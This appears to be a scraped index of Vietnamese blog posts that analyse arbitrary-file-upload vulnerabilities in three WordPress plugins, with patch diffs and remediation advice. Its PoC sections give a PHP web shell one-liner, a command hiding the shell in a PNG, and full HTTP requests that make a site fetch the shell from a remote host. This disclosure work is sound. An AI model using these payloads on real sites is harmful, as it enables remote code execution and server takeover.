wp_unique_filename() đảm bảo tên file không trùng với các file đã có. $path là đường dẫn đầy đủ nơi file sẽ được lưu. $upload_dir['path'] thường có dạng là wp-content/uploads/year/month Khởi tạo hệ thống Filesystem của WordPress global $wp_filesystem; if ( ! class_exists( 'WP_Filesystem' ) ) { require_once ABSPATH . '/wp-admin/includes/file.php'; } WP_Filesystem(); Di chuyển file tạm sang thư mục uploads $wp_filesystem-\u003emove( $tmp_file, $path ); Di chuyển file từ temp ($tmp_file) sang uploads ($path). Sử dụng $wp_filesystem-\u003emove() thay vì rename() để tương thích mọi môi trường (Direct, FTP, …). ajax_handler_download_pdf_media() được dăng ký làm callback cho action hook add_action( 'wp_ajax_epdf_wf_download_pdf_media', array( $this, 'ajax_handler_download_pdf_media' ) ); Điều này có nghĩa là: wp_ajax_ yêu cầu người dùng đã đăng nhập(tối thiếu là Subcriber) mới được gửi request đươc chấp nhận epdf_wf_download_pdf_media là action được truyền trong param Khi người dùng đã đăng nhập gửi request đến endpoint /wp-admin/admin-ajax.php với param action=epdf_wf_download_pdf_media thì ajax_handler_download_pdf_media() được gọi để xử lý request ","date":"2025-11-06","objectID":"/vi/posts/2025-11-06-cve-2025-10647/:3:2","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/vi/posts/2025-11-06-cve-2025-10647/#vulnerable-code"},{"categories":["CVE Analyst"],"collections":null,"content":"Flow\rgraph TD\rA[\"Subcriber POST -\u003e /wp-admin/admin-ajax.php?action=epdf_wf_download_pdf_media\u0026url=...\"] --\u003e B[\"ajax_handler_download_pdf_media()\"]\rB --\u003e C[\"check_ajax_referer('epdf_wf_download_pdf_media')\"]\rC --\u003e D[\"download_url($url) -\u003e $tmp_file (temporary file)\"]\rD --\u003e E{\"is_wp_error($tmp_file) ?\"}\rE -- \"yes\" --\u003e F[\"wp_send_json_error() -\u003e STOP\"]\rE -- \"no\" --\u003e K[\"Uploaded file accessible → potential RCE\"]\rgraph TD\rA[\"Subcriber POST -\u003e /wp-admin/admin-ajax.php?action=epdf_wf_download_pdf_media\u0026url=...\"] --\u003e B[\"ajax_handler_download_pdf_media()\"]\rB --\u003e C[\"check_ajax_referer('epdf_wf_download_pdf_media')\"]\rC --\u003e D[\"download_url($url) -\u003e $tmp_file (temporary file)\"]\rD --\u003e E{\"is_wp_error($tmp_file) ?\"}\rE -- \"yes\" --\u003e F[\"wp_send_json_error() -\u003e STOP\"]\rE -- \"no\" --\u003e K[\"Uploaded file accessible → potential RCE\"]\rgraph TD\rA[\"Subcriber POST -\u003e /wp-admin/admin-ajax.php?action=epdf_wf_download_pdf_media\u0026url=...\"] --\u003e B[\"ajax_handler_download_pdf_media()\"]\rB --\u003e C[\"check_ajax_referer('epdf_wf_download_pdf_media')\"]\rC --\u003e D[\"download_url($url) -\u003e $tmp_file (temporary file)\"]\rD --\u003e E{\"is_wp_error($tmp_file) ?\"}\rE -- \"yes\" --\u003e F[\"wp_send_json_error() -\u003e STOP\"]\rE -- \"no\" --\u003e K[\"Uploaded file accessible → potential RCE\"]\rgraph TD\rA[\"Subcriber POST -\u003e /wp-admin/admin-ajax.php?action=epdf_wf_download_pdf_media\u0026url=...\"] --\u003e B[\"ajax_handler_download_pdf_media()\"]\rB --\u003e C[\"check_ajax_referer('epdf_wf_download_pdf_media')\"]\rC --\u003e D[\"download_url($url) -\u003e $tmp_file (temporary file)\"]\rD --\u003e E{\"is_wp_error($tmp_file) ?\"}\rE -- \"yes\" --\u003e F[\"wp_send_json_error() -\u003e STOP\"]\rE -- \"no\" --\u003e K[\"Uploaded file accessible → potential RCE\"]\r","date":"2025-11-06","objectID":"/vi/posts/2025-11-06-cve-2025-10647/:3:3","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/vi/posts/2025-11-06-cve-2025-10647/#flow"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-11-06","objectID":"/vi/posts/2025-11-06-cve-2025-10647/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/vi/posts/2025-11-06-cve-2025-10647/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rTruy cập trang chứa form được tạo từ WPForms sử dụng PDF Viewer Lấy nonce Tạo file .php chứa code RCE và lưu trữ trên internet \u003c?php system($_REQUEST[\"cmd\"]) ?\u003e Gửi POST request với url trỏ đến file vừa tạo. POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Cookie: wordpress_86a9106ae65537651a8e456835b316ab=sub%7C1762165151%7C5VGNGPhUPc74oSqabIRMtpA8jrLrn2JYdg6Lc4fqU8I%7C69db0f51f219492ec3f150bb86bc1364f7cd33442587ddf3f1bf334e4cdec409; wp-settings-time-2=1761725656; wp-settings-4=libraryContent%3Dbrowse%26uploader%3D1%26mfold%3Do; wp-settings-time-4=1761637043; wp-settings-2=editor%3Dtinymce%26libraryContent%3Dbrowse; wp-settings-time-3=1761711790; wp-settings-3=libraryContent%3Dbrowse; _lscache_vary=fff4fa950d2b9daa95c3289bb2a7040a; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=sub%7C1762165151%7C5VGNGPhUPc74oSqabIRMtpA8jrLrn2JYdg6Lc4fqU8I%7Ca7cb9996e74be71e18c68f339c0ad07a43687c7eb701f89fe90374cc2a783131; wp-settings-time-5=1761992371 ... _ajax_nonce=ea2ccf0ccd\u0026action=epdf_wf_download_pdf_media\u0026url=https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php Truy cập file vừa tạo và RCE RCE với file upload\r","date":"2025-11-06","objectID":"/vi/posts/2025-11-06-cve-2025-10647/:4:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/vi/posts/2025-11-06-cve-2025-10647/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rLỗ hổng cho phép arbitrary file upload trong ajax_handler_download_pdf_media() là do thiếu kiểm tra quyền và kiểu file khi tải file từ URL, dẫn đến khả năng kẻ tấn công có tài khoản Subscriber tải lên file thực thi (ví dụ .php) và gây RCE. Nhà phát triển đã khắc phục bằng cách kiểm tra current_user_can('upload_files') và xác thực MIME với wp_check_filetype() trong phiên bản 1.1.6. Đối với site bị ảnh hưởng, cần cập nhật lên 1.1.6 ngay, kiểm tra và xoá các file khả nghi trong thư mục uploads, rà soát quyền người dùng và nhật ký để phát hiện dấu hiệu khai thác. ","date":"2025-11-06","objectID":"/vi/posts/2025-11-06-cve-2025-10647/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/vi/posts/2025-11-06-cve-2025-10647/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"Key Takeaway\rLuôn kiểm tra quyền người dùng (current_user_can) trước khi thực hiện upload qua AJAX. Luôn xác thực kiểu/MIME của file (wp_check_filetype / whitelist) trước khi lưu. Cập nhật plugin nhanh chóng khi có bản vá; rà soát file upload và log sau khi phát hiện lỗi. Áp dụng nguyên tắc ít quyền nhất (least privilege) và giám sát hành vi bất thường trong media/uploads. ","date":"2025-11-06","objectID":"/vi/posts/2025-11-06-cve-2025-10647/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/vi/posts/2025-11-06-cve-2025-10647/#key-takeaway"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rArbitrary File Upload WordPress Embed PDF for WPForms Plugin \u003c= 1.1.5 is vulnerable to Arbitrary File Upload ","date":"2025-11-06","objectID":"/vi/posts/2025-11-06-cve-2025-10647/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/vi/posts/2025-11-06-cve-2025-10647/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Podlove Podcast Publisher Plugin.","date":"2025-11-05","objectID":"/vi/posts/2025-11-05-cve-2025-10147/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/vi/posts/2025-11-05-cve-2025-10147/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin Podlove Podcast Publisher cho WordPress có lỗ hổng cho phép arbitrary file uploads do thiếu kiểm tra loại tệp trong hàm 'move_as_original_file' ở tất cả các phiên bản tới và bao gồm 4.2.6. Điều này cho phép unauthenticated attackers tải lên các tệp tùy ý lên máy chủ của site bị ảnh hưởng, điều có thể dẫn tới remote code execution. CVE ID: CVE-2025-10147 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 4.2.6 Patched Versions: 4.2.7 CVSS severity: High (10) Required Privilege: Unauthenticated Product: WordPress Podlove Podcast Publisher Plugin ","date":"2025-11-05","objectID":"/vi/posts/2025-11-05-cve-2025-10147/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/vi/posts/2025-11-05-cve-2025-10147/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Podlove Podcast Publisher: 4.2.6 (vulnerable) và 4.2.7 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. ","date":"2025-11-05","objectID":"/vi/posts/2025-11-05-cve-2025-10147/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/vi/posts/2025-11-05-cve-2025-10147/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\r","date":"2025-11-05","objectID":"/vi/posts/2025-11-05-cve-2025-10147/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/vi/posts/2025-11-05-cve-2025-10147/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Vulnerable Code\rTheo mô tả của CVE thì vị trí lỗi nằm ở hàm move_as_original_file() public function move_as_original_file($file) { $move_new_file = @rename($file, $this-\u003eoriginal_file()); if (false === $move_new_file) { Log::get()-\u003eaddWarning( sprintf( __('Podlove Image Cache: The downloaded image could not be moved to %s.'), $this-\u003eoriginal_file() ) ); } } Hàm move_as_original_file($file) Thực hiện di chuyển file tạm $file (vừa được tải về từ URL) → sang đường dẫn cố định trả về bởi $this-\u003eoriginal_file(). rename() trong PHP = move file (chuyển vị trí file, không copy). Dấu @ dùng để ẩn lỗi PHP nếu thao tác thất bại. Nếu rename() trả về false, plugin ghi cảnh báo vào log. public function original_file() { return implode(DIRECTORY_SEPARATOR, [ $this-\u003eupload_basedir, $this-\u003efile_name('original') ]); } → Tạo đường dẫn tuyệt đối trên server, ví dụ: /var/www/html/wp-content/cache/podlove/6e/7262f37a8018efafa4764ea97a4c26/original.png $this-\u003eupload_basedir (từ __construct()) Class Image { public function __construct($url, $file_name = '') { // FIXME: if $file_name is empty, the url will not work. I must not treat this silently! $this-\u003esource_url = trim($url ?? ''); $this-\u003efile_name = sanitize_title($file_name); // manually remove troublemaking characters // @see https://community.podlove.org/t/solved-kind-of-cover-art-disappears-caching-issue/478/ // @see https://sendegate.de/t/problem-mit-caching-von-grafiken/2947 if (function_exists('iconv')) { $this-\u003efile_name = iconv('UTF-8', 'ASCII//TRANSLIT', $this-\u003efile_name); } $this-\u003efile_name = preg_replace('~[^-a-z0-9_]+~', '', $this-\u003efile_name); $this-\u003efile_extension = $this-\u003eextract_file_extension(); $this-\u003eid = md5($url.$this-\u003efile_name); // create subdirectories to avoid too many directories in the root directory $id_directory = substr($this-\u003eid, 0, 2).'/'.substr($this-\u003eid, 2); $this-\u003eupload_basedir = self::cache_dir().$id_directory; $this-\u003eupload_baseurl = content_url('cache/podlove/').$id_directory; } } Được tạo dựa trên cache_dir() và hash MD5 của URL, → nằm trong thư mục: wp-content/cache/podlove/\u003c2 ký tự đầu\u003e/\u003cphần còn lại\u003e/ Mẹo Ở đây ta có thể chỉ truyền mỗi $url, ví dụ: $url=\"https://example.com/filename.php\" thì $this-\u003eid=\"b1555a128239e3f59ccfb8d17e5b6c5a\" $this-\u003eupload_basedir=\"http://localhost/wp-content/cache/podlove/b1/555a128239e3f59ccfb8d17e5b6c5a\" Ta có thể kiểm soát được đường dẫn của file được tạo.\rmove_as_original_file() được gọi trong hàm download_source() public function download_source() { $source_url = $this-\u003esource_url; ... $source_domain = wp_parse_url($source_url, PHP_URL_HOST); $current_domain = explode(':', $_SERVER['HTTP_HOST'])[0]; // if domains match, see if the image is part of the Publisher // and can be copied on the filesystem, skipping http if ($current_domain == $source_domain) { ... return; } // for download_url() require_once ABSPATH.'wp-admin/includes/file.php'; $result = self::download_url($this-\u003esource_url); ... list($temp_file, $response) = $result; if (!\\Podlove\\is_image($temp_file)) { ... wp_delete_file($temp_file); return; } $this-\u003ecreate_basedir(); $this-\u003esave_cache_data($response); $this-\u003emove_as_original_file($temp_file); wp_delete_file($temp_file); $this-\u003eadd_donotbackup_dotfile(); } Hàm này tải ảnh từ URL người dùng cung cấp, kiểm tra hợp lệ, rồi lưu cố định vào thư mục cache của plugin. Cụ thể: $source_url lấy URL hình ảnh do người dùng cung cấp. Hàm tách domain từ $source_url và domain hiện tại của site ($_SERVER['HTTP_HOST']). Nếu hai domain trùng nhau → ảnh nằm trong cùng site thực hiện logic và trả về. Nếu khác domain → dùng download_url() để tải file tạm về máy chủ. public static function download_url($url, $timeout = 300, $extra_args = []) { ... $tmpfname = wp_tempnam($url); if (!$tmpfname) { return new \\WP_Error('http_no_file', __('Could not create Temporary file.')); } $default_args = [ 'timeout' =\u003e $timeout, 'stream' =\u003e true, 'filename' =\u003e $tmpfname, 'sslverify' =\u003e \\Podlove\\get_setting('website', 'ssl_verify_peer') == 'on', ","date":"2025-11-05","objectID":"/vi/posts/2025-11-05-cve-2025-10147/:3:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/vi/posts/2025-11-05-cve-2025-10147/#vulnerable-code"},{"categories":["CVE Analyst"],"collections":null,"content":"Flow\rgraph TD\rA[\"Request with params (podlove_image_cache_url)\"] --\u003e B[\"podlove_handle_cache_files()\"]\rB --\u003e C[\"hex2str() → $source_url → new Image(...)\"]\rC --\u003e D[\"download_source() → download_url() → temporary file\"]\rD --\u003e E[\"is_image() check\"]\rE -- pass --\u003e F[\"move_as_original_file() → save to wp-content/cache/podlove/first_2_characters/remaining_characters/\"]\rF --\u003e G[\"File accessible → possible RCE\"]\rE -- fail --\u003e H[\"Delete temp file → stop\"]\rgraph TD\rA[\"Request with params (podlove_image_cache_url)\"] --\u003e B[\"podlove_handle_cache_files()\"]\rB --\u003e C[\"hex2str() → $source_url → new Image(...)\"]\rC --\u003e D[\"download_source() → download_url() → temporary file\"]\rD --\u003e E[\"is_image() check\"]\rE -- pass --\u003e F[\"move_as_original_file() → save to wp-content/cache/podlove/first_2_characters/remaining_characters/\"]\rF --\u003e G[\"File accessible → possible RCE\"]\rE -- fail --\u003e H[\"Delete temp file → stop\"]\rgraph TD\rA[\"Request with params (podlove_image_cache_url)\"] --\u003e B[\"podlove_handle_cache_files()\"]\rB --\u003e C[\"hex2str() → $source_url → new Image(...)\"]\rC --\u003e D[\"download_source() → download_url() → temporary file\"]\rD --\u003e E[\"is_image() check\"]\rE -- pass --\u003e F[\"move_as_original_file() → save to wp-content/cache/podlove/first_2_characters/remaining_characters/\"]\rF --\u003e G[\"File accessible → possible RCE\"]\rE -- fail --\u003e H[\"Delete temp file → stop\"]\rgraph TD\rA[\"Request with params (podlove_image_cache_url)\"] --\u003e B[\"podlove_handle_cache_files()\"]\rB --\u003e C[\"hex2str() → $source_url → new Image(...)\"]\rC --\u003e D[\"download_source() → download_url() → temporary file\"]\rD --\u003e E[\"is_image() check\"]\rE -- pass --\u003e F[\"move_as_original_file() → save to wp-content/cache/podlove/first_2_characters/remaining_characters/\"]\rF --\u003e G[\"File accessible → possible RCE\"]\rE -- fail --\u003e H[\"Delete temp file → stop\"]\r","date":"2025-11-05","objectID":"/vi/posts/2025-11-05-cve-2025-10147/:3:2","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/vi/posts/2025-11-05-cve-2025-10147/#flow"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-11-05","objectID":"/vi/posts/2025-11-05-cve-2025-10147/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/vi/posts/2025-11-05-cve-2025-10147/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rThêm \u003cphp\u003e tag vào file ảnh và đổi extension thành .php echo '\u003c?php system($_REQUEST[\"cmd\"]); ?\u003e' \u003e\u003e rce.png mv rce.png rce.php ❯ cat rce.php �PNG ␦ IHD��Ud�tEXtSoftwaregnome-screenshot��\u003e-tEXtCreation TimeSat 01 Nov 2025 02:58:29 PM +075����IDATH���A � ��GHI��l��l�˅��K�n�D �H)���a:kooܲ\u003c`�u�o� �{�3�9�1�~�� �9����P�1����R�!D\u003eLk���FT�r�|�Ru�� u��o'�`��?�!\"�� 2k���IEND�B`�\u003c?php system($_REQUEST[\"cmd\"]); ?\u003e Lưu file ở đâu đó trên internet, domain không trùng với wordpress domain website, ví dụ: https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php Mã hóa hex(https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php) ❯ echo -n \"https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php\" | xxd -p 68747470733a2f2f6769746875622e636f6d2f7734316275312f773431746573742f7261772f726566732f68656164732f6d61696e2f7263652e706870 Gửi GET request với param podlove_image_cache_url=68747470733a2f2f6769746875622e636f6d2f7734316275312f773431746573742f7261772f726566732f68656164732f6d61696e2f7263652e706870 Upload file thành công\rTruy cập file vừa tạo và RCE RCE với file upload\rThông tin\r02/9acf743e6beb9c8e4395ee694d6504 như phân tích trước đó, nó là md5($url), sau đó tạo cấu trúc thư mục first_2_characters/remaining_characters dựa trên kết quả của md5() ","date":"2025-11-05","objectID":"/vi/posts/2025-11-05-cve-2025-10147/:4:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/vi/posts/2025-11-05-cve-2025-10147/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rLỗ hổng trong Podlove Podcast Publisher ≤ 4.2.6 cho phép tải lên file tùy ý do thiếu kiểm tra định dạng trong move_as_original_file(). Kẻ tấn công có thể tải file độc hại (ví dụ .php) lên thư mục: wp-content/cache/podlove/\u003cfirst2\u003e/\u003crest\u003e/, từ đó dẫn đến Remote Code Execution (RCE) nếu file được truy cập công khai. ","date":"2025-11-05","objectID":"/vi/posts/2025-11-05-cve-2025-10147/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/vi/posts/2025-11-05-cve-2025-10147/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"Key Takeaway\rNguyên nhân: kiểm tra MIME yếu, không chặn phần mở rộng nguy hiểm. Bản vá (≥ 4.2.7): thêm xác thực bằng wp_check_filetype_and_ext() và danh sách denylist. Cách khắc phục: cập nhật plugin, chặn thực thi PHP trong thư mục cache, xóa file lạ. ","date":"2025-11-05","objectID":"/vi/posts/2025-11-05-cve-2025-10147/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/vi/posts/2025-11-05-cve-2025-10147/#key-takeaway"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rArbitrary File Upload WordPress Podlove Podcast Publisher Plugin \u003c= 4.2.6 is vulnerable to Arbitrary File Upload ","date":"2025-11-05","objectID":"/vi/posts/2025-11-05-cve-2025-10147/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/vi/posts/2025-11-05-cve-2025-10147/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress RTMKit Plugin.","date":"2025-11-04","objectID":"/vi/posts/2025-11-04-cve-2025-62065/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/vi/posts/2025-11-04-cve-2025-62065/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rCVE ID: CVE-2025-62065 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 1.6.5 Patched Versions: 1.6.6 CVSS severity: Medium (9.9) Required Privilege: Contributor Product: WordPress RTMKit Plugin ","date":"2025-11-04","objectID":"/vi/posts/2025-11-04-cve-2025-62065/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/vi/posts/2025-11-04-cve-2025-62065/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - RTMKit: 1.6.5 (vulnerable) và 1.6.6 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. Elementor ","date":"2025-11-04","objectID":"/vi/posts/2025-11-04-cve-2025-62065/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/vi/posts/2025-11-04-cve-2025-62065/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\r","date":"2025-11-04","objectID":"/vi/posts/2025-11-04-cve-2025-62065/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/vi/posts/2025-11-04-cve-2025-62065/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch diff\rfunction rtm_handle_upload_template() { check_ajax_referer('rtm_template_nonce', 'nonce'); if (empty($_FILES['file'])) { wp_send_json_error('Tidak ada file yang diupload.'); } $file = $_FILES['file']; $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION)); if ($ext !== 'zip') { wp_send_json_error('Hanya file .zip yang diperbolehkan.'); } $upload_dir = wp_upload_dir(); // path di server $tmpFilePath = $upload_dir['basedir'] . '/rtm_temp_' . wp_unique_filename($upload_dir['basedir'], $file['name']); // URL publik $tmpFileUrl = $upload_dir['baseurl'] . '/' . basename($tmpFilePath); if (!move_uploaded_file($file['tmp_name'], $tmpFilePath)) { wp_send_json_error('Gagal menyimpan file sementara.'); } $res = $this-\u003etemplate_extract($tmpFileUrl, $file['name'], true); // setelah selesai hapus file if (file_exists($tmpFilePath)) unlink($tmpFilePath); if ($res) { wp_send_json_success('Template berhasil diupload dan diekstrak.'); } else { wp_send_json_error($res); } } function template_extract($url, $id, $return = false) { $upload_dir = wp_upload_dir(); $custom_dir = $upload_dir['basedir'] . '/rometheme_template'; $tempFile = wp_tempnam($url); $hashId = wp_hash($id); $targetDir = $custom_dir . '/' . $hashId; $response = wp_remote_get($url, ['timeout' =\u003e 300]); if (is_wp_error($response)) { wp_send_json_error($response-\u003eget_error_message()); } $fileContent = wp_remote_retrieve_body($response); file_put_contents($tempFile, $fileContent); $zip = new ZipArchive(); if ($zip-\u003eopen($tempFile) === TRUE) { wp_mkdir_p($targetDir); $zip-\u003eextractTo($targetDir); $zip-\u003eclose(); unlink($tempFile); $option = get_option('rtm_template_installed', []); // Default ke array jika tidak ada option if (!is_array($option)) { $option = []; // Pastikan $option adalah array } $option[$hashId] = [ 'template_id' =\u003e $id ]; update_option('rtm_template_installed', $option); // Simpan kembali ke database if ($return) { return true; } else { wp_send_json_success(['message' =\u003e 'success extract', 'template' =\u003e $hashId]); } } } Trong phiên bản lỗi: Không kiểm tra quyền người dùng hợp lệ: chỉ gọi check_ajax_referer() nhưng không kiểm tra capability (ví dụ current_user_can) → user có nonce hợp lệ hoặc nonce bị lộ vẫn có thể upload. Lưu file tạm vào thư mục public (wp_upload_dir()): $tmpFilePath nằm trong uploads/ nên có thể truy cập qua URL ($tmpFileUrl) trong thời gian file tồn tại. Lấy lại file qua URL public trước khi giải nén: template_extract() dùng wp_remote_get($tmpFileUrl) → phụ thuộc vào URL công khai. Giải nén trực tiếp vào thư mục public: extractTo($targetDir) trong uploads/rometheme_template → nếu file .php được chép lên, web server có thể thực thi. Không whitelist/deny extension: không loại bỏ hoặc từ chối các file thực thi (.php, .phtml, .phar, .sh, .exe, …). Không kiểm tra nội dung file (embedded PHP): không có bước đọc/scan để phát hiện \u003c?php trước khi lưu. Rủi ro tạm thời public: vì file tạm là public trong suốt quá trình, kẻ tấn công có thời gian truy cập/thiết lập payload trước khi file bị unlink. =\u003e Khả năng RCE rất cao. function rtm_handle_upload_template() { check_ajax_referer('rtm_template_nonce', 'nonce'); if (empty($_FILES['file'])) { wp_send_json_error('No File Uploaded.'); } if (! current_user_can('manage_options')) { wp_send_json_error( array('message' =\u003e 'Insufficient permissions'), 403 ); } $file = $_FILES['file']; $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION)); if ($ext !== 'zip') { wp_send_json_error('Only .zip file allowed.'); } $upload_dir = wp_upload_dir(); // Direktori aman (bukan langsung ke uploads publik) $base_safe_dir = $upload_dir['basedir'] . '//rometheme_template/'; $tmp_dir = $base_safe_dir . 'tmp/'; if (! file_exists($tmp_dir)) { wp_mkdir_p($tmp_dir); // cegah eksekusi file php di folder ini @file_put_contents( $base_safe_dir . '.htaccess', \"Options -Indexes \u003cFilesMatch \".(php|phtml|phar)$\"\u003e Deny from all\u003c/FilesMatch\u003e\" ); } // Buat nama unik untuk zip $unique = wp_generate_password(12, false); $tmp_","date":"2025-11-04","objectID":"/vi/posts/2025-11-04-cve-2025-62065/:3:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-62065 Analysis \u0026 POC","uri":"/vi/posts/2025-11-04-cve-2025-62065/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"Vulnerable Code\rTrong phiên bản lỗi, Hàm nhận một file upload(kỳ vọng .zip), lưu tạm vào thư mục uploads/, sau đó gọi template_extract() để tải lại và giải nén nó. Cuối cùng xóa file tạm và trả JSON success/fail. Cụ thể: check_ajax_referer('rtm_template_nonce', 'nonce') Giúp bảo vệ trước CSRF - đảm bảo request AJAX hợp lệ và có nonce. Khi search với từ khóa rtm_template_nonce trong thư mục plugin: Cách nonce có action rtm_template_nonce được tạo\rwp_localize_script() sẽ in một đoạn \u003cscript\u003e inline vào trang và trong đó khai báo một biến JS (object) chứa dữ liệu được truyền vào. Trong trường hợp này, object là rkit_libs lưu trữ các giá trị logo_url, ajax_url, template_nonce. Mẹo Vì lỗ hổng được công bố với đặc quyền Contributor, thường liên quan đến việc tạo post nên ta thử tạo post và gọi đối tượng rkit_libs từ console của trình duyệt để lấy giá trị nonce. Thông tin\rTa edit post bằng Elementor , vì các widget của plugin được sử dụng bằng Elementor, editor mặc định không có. Lấy nonce từ console của trình duyệt\rKiểm tra $_FILES['file'] và extension: if (empty($_FILES['file'])) { wp_send_json_error('Tidak ada file yang diupload.'); } $file = $_FILES['file']; $ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION)); if ($ext !== 'zip') { wp_send_json_error('Hanya file .zip yang diperbolehkan.'); } Đảm bảo client gửi file và chỉ cho phép upload .zip Xác định đường dẫn tạm và URL công khai $upload_dir = wp_upload_dir(); $tmpFilePath = $upload_dir['basedir'] . '/rtm_temp_' . wp_unique_filename($upload_dir['basedir'], $file['name']); $tmpFileUrl = $upload_dir['baseurl'] . '/' . basename($tmpFilePath); Tạo tên file tạm hợp lệ trong thư mục uploads và URL truy cập đến file đó, ví dụ: $tmpFilePath = \"/var/www/html/wp-content/uploads/rtm_temp_filename.zip\" $tmpFileUrl = \"http://localhost/wp-content/uploads/rtm_temp_filename.zip\" move_uploaded_file($file['tmp_name'], $tmpFilePath) Di chuyển file upload từ tmp PHP vào nơi tạm định nghĩa. Gọi template_extract($tmpFileUrl, $file['name'], true) function template_extract($url, $id, $return = false) { // Lấy thư mục upload của WordPress và tạo thư mục lưu template $upload_dir = wp_upload_dir(); $custom_dir = $upload_dir['basedir'] . '/rometheme_template'; // Tạo file tạm để tải file từ URL về $tempFile = wp_tempnam($url); // Tạo hash ID cho template $hashId = wp_hash($id); $targetDir = $custom_dir . '/' . $hashId; // Tải file từ URL $response = wp_remote_get($url, ['timeout' =\u003e 300]); // Kiểm tra lỗi trong quá trình tải file if (is_wp_error($response)) { wp_send_json_error($response-\u003eget_error_message()); } // Lưu nội dung của file ZIP vào file tạm $fileContent = wp_remote_retrieve_body($response); file_put_contents($tempFile, $fileContent); // Mở file ZIP và giải nén vào thư mục mục tiêu $zip = new ZipArchive(); if ($zip-\u003eopen($tempFile) === TRUE) { wp_mkdir_p($targetDir); // Tạo thư mục nếu chưa có $zip-\u003eextractTo($targetDir); // Giải nén vào thư mục mục tiêu $zip-\u003eclose(); unlink($tempFile); // Xóa file tạm // Cập nhật tùy chọn 'rtm_template_installed' trong database $option = get_option('rtm_template_installed', []); if (!is_array($option)) { $option = []; } $option[$hashId] = ['template_id' =\u003e $id]; update_option('rtm_template_installed', $option); // Trả về kết quả if ($return) { return true; } else { wp_send_json_success(['message' =\u003e 'success extract', 'template' =\u003e $hashId]); } } } Thông tin\rỞ đây file không được giải nén thẳng nên không thể sử dụng kỹ thuật Zip Slip để di chuyển 